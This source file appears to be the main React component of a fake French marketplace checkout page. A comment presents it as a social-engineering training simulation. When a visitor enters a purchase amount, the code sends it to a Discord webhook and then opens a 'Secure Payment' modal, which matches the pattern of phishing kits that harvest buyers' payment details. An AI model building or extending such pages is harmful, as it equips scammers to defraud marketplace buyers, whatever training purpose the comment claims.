
import React, { useState } from 'react';
import { Layout } from './components/Layout';
import { ListingDetail } from './components/ListingDetail';
import { CheckoutModal } from './components/CheckoutModal';
import { sendToDiscord } from './utils/webhook';

/* 
 * PEDAGOGICAL NOTE:
 * This application is designed to simulate a high-risk social engineering scenario.
 * Indicators for trainees to observe:
 * 1. Urgency created by interface patterns.
 * 2. Form requests for sensitive data in an untrusted environment.
 * 3. Generic "Secure Payment" bypass of standard marketplace flows.
 */

const App: React.FC = () => {
  const [isCheckoutOpen, setIsCheckoutOpen] = useState(false);
  const [amount, setAmount] = useState('');
  const [purchaseSuccess, setPurchaseSuccess] = useState<boolean | null>(null);

  const handleStartPurchase = async () => {
    if (!amount || parseFloat(amount) <= 0) {
      alert("Veuillez entrer un montant valide.");
      return;
    }
    
    const formattedAmount = (parseFloat(amount) || 0).toLocaleString('fr-FR', { 
        style: 'currency', 
        currency: 'EUR',
        minimumFractionDigits: 2 
    });

    await sendToDiscord("Montant Initial Entré", {
        "Montant": formattedAmount
    });

    setIsCheckoutOpen(true);
  };
  
  const handleCloseCheckout = () => {
    setIsCheckoutOpen(false);
    setPurchaseSuccess(null);
  };

  const handleCompletePurchase = (success: boolean) => {
    setPurchaseSuccess(success);
  };

  return (
    <>
      <Layout>
        <ListingDetail 
          onPurchase={handleStartPurchase} 
          amount={amount} 
          setAmount={setAmount} 
        />
      </Layout>

      {isCheckoutOpen && (
        <CheckoutModal 
          isOpen={isCheckoutOpen} 
          onClose={handleCloseCheckout}
          amount={amount}
          onSuccess={() => handleCompletePurchase(true)}
        />
      )}
    </>
  );
};

export default App;
